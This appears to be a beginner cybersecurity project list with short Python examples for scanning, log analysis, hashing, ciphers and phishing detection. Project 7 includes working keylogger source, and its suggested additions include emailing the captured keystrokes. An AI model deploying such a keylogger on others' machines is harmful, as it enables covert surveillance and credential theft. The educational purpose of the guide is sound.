# Beginner Projects

These projects are for people just starting. Each one teaches a specific skill. Build them in order.

---

## Project 1: Port Scanner

**What it does:**

Scans a target for open ports.

**Skills learned:**

- Python basics
- Sockets
- Networking
- Loops

**Tools needed:**

- Python 3
- Text editor

**Code:**

```python
import socket

target = "127.0.0.1"
ports = [22, 80, 443, 3306, 8080]

for port in ports:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    result = s.connect_ex((target, port))
    if result == 0:
        print(f"Port {port} is OPEN")
    s.close()
```

**What to add:**

- Scan a range of ports
- Take target as input
- Save results to a file
- Add timing

**Documentation:**

- Write a README
- Add screenshots
- Explain how it works

---

## Project 2: Password Strength Checker

**What it does:**

Checks if a password is strong.

**Skills learned:**

- Python basics
- String handling
- Conditionals
- Regex

**Tools needed:**

- Python 3

**Code:**

```python
import re

def check_password(password):
    score = 0
    
    if len(password) >= 12:
        score += 1
    if re.search(r"[A-Z]", password):
        score += 1
    if re.search(r"[a-z]", password):
        score += 1
    if re.search(r"[0-9]", password):
        score += 1
    if re.search(r"[!@#$%^&*]", password):
        score += 1
    
    if score == 5:
        return "Strong"
    elif score >= 3:
        return "Medium"
    else:
        return "Weak"

password = input("Enter password: ")
print(check_password(password))
```

**What to add:**

- Check against common passwords
- Estimate crack time
- GUI version
- Save results

**Documentation:**

- Write a README
- Explain scoring
- Add examples

---

## Project 3: Log Analyzer

**What it does:**

Reads a log file and finds suspicious activity.

**Skills learned:**

- File handling
- String parsing
- Regex
- Data analysis

**Tools needed:**

- Python 3
- Sample log file

**Code:**

```python
import re

def analyze_log(filename):
    failed_logins = {}
    
    with open(filename, "r") as f:
        for line in f:
            if "Failed password" in line:
                match = re.search(r"from (\d+\.\d+\.\d+\.\d+)", line)
                if match:
                    ip = match.group(1)
                    failed_logins[ip] = failed_logins.get(ip, 0) + 1
    
    print("Suspicious IPs:")
    for ip, count in failed_logins.items():
        if count > 5:
            print(f"{ip}: {count} failed attempts")

analyze_log("auth.log")
```

**What to add:**

- Parse multiple log types
- Export to CSV
- Add charts
- Real-time monitoring

**Documentation:**

- Write a README
- Explain log format
- Add examples

---

## Project 4: File Hash Checker

**What it does:**

Calculates hashes of files to verify integrity.

**Skills learned:**

- Hashing
- File handling
- Python libraries
- Command line

**Tools needed:**

- Python 3

**Code:**

```python
import hashlib

def hash_file(filename, algorithm="sha256"):
    h = hashlib.new(algorithm)
    
    with open(filename, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            h.update(chunk)
    
    return h.hexdigest()

filename = input("Enter filename: ")
print(f"SHA-256: {hash_file(filename)}")
print(f"MD5: {hash_file(filename, 'md5')}")
```

**What to add:**

- Compare two files
- Check against VirusTotal
- GUI version
- Batch processing

**Documentation:**

- Write a README
- Explain hashing
- Add examples

---

## Project 5: Caesar Cipher

**What it does:**

Encrypts and decrypts text using Caesar cipher.

**Skills learned:**

- Encryption basics
- String manipulation
- Functions
- User input

**Tools needed:**

- Python 3

**Code:**

```python
def caesar_cipher(text, shift, mode="encrypt"):
    result = ""
    
    if mode == "decrypt":
        shift = -shift
    
    for char in text:
        if char.isalpha():
            base = ord("A") if char.isupper() else ord("a")
            result += chr((ord(char) - base + shift) % 26 + base)
        else:
            result += char
    
    return result

text = input("Enter text: ")
shift = int(input("Enter shift: "))
mode = input("encrypt or decrypt: ")

print(caesar_cipher(text, shift, mode))
```

**What to add:**

- Brute force decrypt
- Support for other ciphers
- GUI version
- File encryption

**Documentation:**

- Write a README
- Explain the cipher
- Add examples

---

## Project 6: Website Header Grabber

**What it does:**

Fetches HTTP headers from a website.

**Skills learned:**

- HTTP
- Python requests
- APIs
- Error handling

**Tools needed:**

- Python 3
- requests library

**Code:**

```python
import requests

def get_headers(url):
    try:
        response = requests.get(url, timeout=5)
        print(f"Status: {response.status_code}")
        print("Headers:")
        for header, value in response.headers.items():
            print(f"  {header}: {value}")
    except Exception as e:
        print(f"Error: {e}")

url = input("Enter URL: ")
get_headers(url)
```

**What to add:**

- Check security headers
- Compare multiple sites
- Save results
- GUI version

**Documentation:**

- Write a README
- Explain HTTP headers
- Add examples

---

## Project 7: Simple Keylogger (Learning Only)

**What it does:**

Records keystrokes (for learning only).

**Warning:** Only use on your own machine. Never on someone else's.

**Skills learned:**

- Python libraries
- Event handling
- File writing
- Ethics

**Tools needed:**

- Python 3
- pynput library

**Code:**

```python
from pynput import keyboard

def on_press(key):
    try:
        with open("keys.txt", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open("keys.txt", "a") as f:
            f.write(f"[{key}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

**What to add:**

- Timestamps
- Stop key
- Encrypt log
- Email report

**Documentation:**

- Write a README
- Explain ethics
- Add warnings

---

## Project 8: Simple SIEM

**What it does:**

Collects and analyzes logs from multiple sources.

**Skills learned:**

- Log parsing
- Data structures
- Alerting
- Python

**Tools needed:**

- Python 3
- Sample logs

**Code:**

```python
import re
from collections import defaultdict

def analyze_logs(log_files):
    events = defaultdict(int)
    
    for log_file in log_files:
        with open(log_file, "r") as f:
            for line in f:
                if "Failed password" in line:
                    events["failed_login"] += 1
                elif "Accepted password" in line:
                    events["successful_login"] += 1
                elif "error" in line.lower():
                    events["error"] += 1
    
    print("Event Summary:")
    for event, count in events.items():
        print(f"  {event}: {count}")

analyze_logs(["auth.log", "syslog"])
```

**What to add:**

- Real-time monitoring
- Multiple log sources
- Alerting rules
- Dashboard

**Documentation:**

- Write a README
- Explain SIEM concepts
- Add examples

---

## Project 9: Phishing Detection Tool

**What it does:**

Analyzes emails for phishing indicators.

**Skills learned:**

- Email parsing
- Regex
- URL analysis
- Python

**Tools needed:**

- Python 3
- Email file

**Code:**

```python
import re

def check_phishing(email_text):
    score = 0
    red_flags = []
    
    # Check for urgent language
    urgent = ["urgent", "immediately", "act now", "verify"]
    for word in urgent:
        if word in email_text.lower():
            score += 1
            red_flags.append(f"Urgent language: {word}")
    
    # Check for suspicious links
    links = re.findall(r"http[s]?://\S+", email_text)
    for link in links:
        if "bit.ly" in link or "tinyurl" in link:
            score += 1
            red_flags.append(f"Shortened URL: {link}")
    
    # Check for requests
    if "password" in email_text.lower():
        score += 1
        red_flags.append("Requests password")
    
    print(f"Phishing score: {score}/10")
    print("Red flags:")
    for flag in red_flags:
        print(f"  - {flag}")

email = input("Paste email text: ")
check_phishing(email)
```

**What to add:**

- More indicators
- URL reputation check
- Email header analysis
- GUI version

**Documentation:**

- Write a README
- Explain phishing
- Add examples

---

## Project 10: Home Lab Setup

**What it does:**

Sets up a complete home lab for practice.

**Skills learned:**

- VirtualBox
- Linux installation
- Networking
- Security tools

**Tools needed:**

- VirtualBox
- Kali Linux ISO
- Metasploitable
- Windows 10 (optional)

**Steps:**

```
1. Install VirtualBox
2. Create Kali Linux VM
3. Create Metasploitable VM
4. Set up host-only network
5. Test connectivity
6. Take snapshots
7. Document setup
```

**What to add:**

- More VMs
- Automated setup script
- Network diagram
- Documentation

**Documentation:**

- Write a README
- Add screenshots
- Explain each step
- Share setup

---

## How to document your project

Every project should have:

```markdown
# Project Name

## Description
What it does.

## Why I built it
Why you built it.

## How it works
Technical explanation.

## Tools used
- Python 3
- Library X

## Installation
How to install.

## Usage
How to use.

## Screenshots
Visual proof.

## Lessons learned
What you learned.

## Future improvements
What's next.
```

---

## Where to share

- GitHub
- LinkedIn
- Personal blog
- Reddit
- Discord

---

## What now?

Pick one project. Build it. Document it. Share it.

> **Ethical Use Only**
> Only hack systems you own or have written permission to test.
> Never use these skills to break the law.
